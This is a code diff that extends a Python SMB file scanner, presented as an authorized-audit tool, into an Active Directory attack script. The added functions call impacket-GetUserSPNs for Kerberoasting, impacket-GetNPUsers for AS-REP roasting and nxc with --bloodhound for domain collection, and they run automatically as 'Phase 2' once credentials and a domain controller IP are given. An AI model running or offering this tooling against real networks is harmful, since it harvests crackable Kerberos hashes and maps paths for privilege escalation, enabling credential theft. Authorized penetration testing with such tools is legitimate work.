@@ -5,6 +5,7 @@ For authorized security audits only. Only use on systems you own or have explici
 """
 
 import argparse
+import subprocess
 import sys
 import re
 from pathlib import PureWindowsPath
@@ -59,7 +60,7 @@ def classify(filename: str) -> list[str]:
     return hits
 
 
-def try_connect(host: str, port: int, username: str, password: str, domain_ip: str
+def try_connect(host: str, port: int, username: str, password: str,
                 domain: str = "") -> SMBConnection | None:
     label = "anonymous" if not username else f"{domain}\\{username}" if domain else username
     try:
@@ -112,22 +113,74 @@ def walk_share(conn: SMBConnection, share: str, path: str = "",
     return findings
 
 
+def kerberoast(domain_ip: str, domain: str, username: str, password: str):
+    subprocess.run([
+        "impacket-GetUserSPNs",
+        "-request",
+        "-dc-ip", domain_ip,
+        f"{domain}/{username}:{password}"
+    ])
+
+
+def bloodhound(domain_ip: str, domain: str, username: str, password: str):
+    subprocess.run([
+        "nxc",
+        "ldap",
+        domain_ip,
+        "-u", username,
+        "-p", password,
+        "--bloodhound",
+        "--collection", "All",
+        "--dns-server", domain_ip
+    ])
+
+
+def asreproast(domain_ip: str, domain: str, username: str):
+    subprocess.run([
+        "impacket-GetNPUsers",
+        "-dc-ip", domain_ip,
+        "-request",
+        f"{domain}/{username}"
+    ])
+
+
+def _run_scan(conn: SMBConnection, host: str, auth_label: str,
+              target_shares: list[str]) -> None:
+    shares = list_shares(conn)
+    if not shares:
+        print("  [!] No shares accessible.")
+        return  # return is now inside the if-block, not before the print statements
+
+    print(f"  [+] Accessible shares: {', '.join(shares)}")
+
+    to_scan = [s for s in shares if s.upper() not in ("IPC$",)]
+    if target_shares:
+        to_scan = [s for s in to_scan if s.lower() in
+                   {t.lower() for t in target_shares}]
+
+    all_findings: list[dict] = []
+    for share in to_scan:
+        print(f"\n  [>] Scanning \\\\{host}\\{share} ...")
+        findings = walk_share(conn, share)
+        all_findings.extend(findings)
+        for f in findings:
+            cats = ", ".join(f["categories"])
+            size_kb = f["size"] // 1024
+            print(f"    [!] {f['path']}  ({size_kb} KB)  → {cats}")
+
+    if not all_findings:
+        print(f"\n  [~] No sensitive files found ({auth_label}).")
+    else:
+        print(f"\n  [=] Total sensitive files found: {len(all_findings)} ({auth_label})")
+
+
 def scan(host: str, port: int, username: str, password: str, domain: str,
-         target_shares: list[str]) -> None:
+         domain_ip: str, target_shares: list[str]) -> None:
     print(f"\n{'='*60}")
     print(f"  SMB Sensitive File Scanner")
     print(f"  Target : {host}:{port}")
     print(f"  Time   : {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
     print(f"{'='*60}\n")
-    
-def kerberoast(domain_ip: str, domain: str, username: str, password: str)
-	impacket-GetUserSPNs -request -dc-ip domain_ip domain/username:password
-
-def bloodhound(domain_ip: str, domain: str, username: str, password: str)
-	nxc ldap domain -u username -p password --bloodhound --collection All --dns-server domain_ip)
-	
-def asreproast(domain_ip: str, domain: str, username: str)
-	impacket-GetNPUsers -dc-ip domain_ip -request -outputfile hashes.asreproast domain/username
 
     # ── Phase 1: anonymous ─────────────────────────────────────────────────────
     print("[*] Phase 1 — Anonymous / guest login")
@@ -151,67 +204,26 @@ def asreproast(domain_ip: str, domain: str, username: str)
     else:
         print("\n[*] Phase 2 skipped — no credentials supplied (use -u/-p).")
 
-
-def _run_scan(conn: SMBConnection, host: str, auth_label: str,
-              target_shares: list[str]) -> None:
-    shares = list_shares(conn)
-    if not shares:
-        print("  [!] No shares accessible.")
-        return
-
-    print(f"  [+] Accessible shares: {', '.join(shares)}")
-
-    to_scan = [s for s in shares if s.upper() not in ("IPC$",)]
-    if target_shares:
-        to_scan = [s for s in to_scan if s.lower() in
-                   {t.lower() for t in target_shares}]
-
-    all_findings: list[dict] = []
-    for share in to_scan:
-        print(f"\n  [>] Scanning \\\\{host}\\{share} ...")
-        findings = walk_share(conn, share)
-        all_findings.extend(findings)
-        for f in findings:
-            cats = ", ".join(f["categories"])
-            size_kb = f["size"] // 1024
-            print(f"    [!] {f['path']}  ({size_kb} KB)  → {cats}")
-
-    if not all_findings:
-        print(f"\n  [~] No sensitive files found ({auth_label}).")
+    # ── Phase 2: authenticated - Kerberoast ────────────────────────────────────
+    if username and domain_ip:
+        print(f"\n[*] Phase 2 — Kerberoast ({username})")
+        kerberoast(domain_ip, domain, username, password)
     else:
-        print(f"\n  [=] Total sensitive files found: {len(all_findings)} ({auth_label})")
-        
-        # ── Phase 2: authenticated - Kerberoast ─────────────────────────────────────────────────
-    if username:        
-    print(f"\n[*] Phase 2 — Authenticated login ({username})")
-        conn = try_connect(username, password, domain, domain_ip)
-        if conn:
-            kerberoast(conn, domain_ip, username, password)
-            conn.logoff()
+        print("\n[*] Kerberoast skipped — no credentials or domain IP supplied (use -u/-p/-dip).")
+
+    # ── Phase 2: authenticated - BloodHound ────────────────────────────────────
+    if username and domain_ip:
+        print(f"\n[*] Phase 2 — BloodHound collection ({username})")
+        bloodhound(domain_ip, domain, username, password)
     else:
-        print("\n[*] Phase 2 skipped — no credentials supplied and domain IP address (use -u/-p/-dip).")
-        
-           # ── Phase 2: authenticated - bloodhound ─────────────────────────────────────────────────
-    if username:        
-    print(f"\n[*] Phase 2 — Authenticated login ({username})")
-        conn = try_connect(username, password, domain, domain_ip)
-        if conn:
-            bloodhound(conn, domain_ip, username, password)
-            conn.logoff()
+        print("\n[*] BloodHound skipped — no credentials or domain IP supplied (use -u/-p/-dip).")
+
+    # ── Phase 2: authenticated - AS-REP Roast ──────────────────────────────────
+    if username and domain_ip:
+        print(f"\n[*] Phase 2 — AS-REP Roast ({username})")
+        asreproast(domain_ip, domain, username)
     else:
-        print("\n[*] Phase 2 skipped — no credentials supplied and domain IP address (use -u/-p/-dip).")
-        
-              # ── Phase 2: authenticated - asreproast ─────────────────────────────────────────────────
-    if username:        
-    print(f"\n[*] Phase 2 — Authenticated login ({username})")
-        conn = try_connect(username, domain, domain_ip)
-        if conn:
-            bloodhound(conn, domain_ip, username, domain)
-            conn.logoff()
-    else:
-        print("\n[*] Phase 2 skipped — no credentials supplied and domain IP address (use -u/-dip).")
-        
-        
+        print("\n[*] AS-REP Roast skipped — no username or domain IP supplied (use -u/-dip).")
 
 
 def main():
@@ -246,6 +258,7 @@ Examples:
         username=args.username,
         password=args.password,
         domain=args.domain,
+        domain_ip=args.domain_ip,
         target_shares=args.shares or [],
     )
 
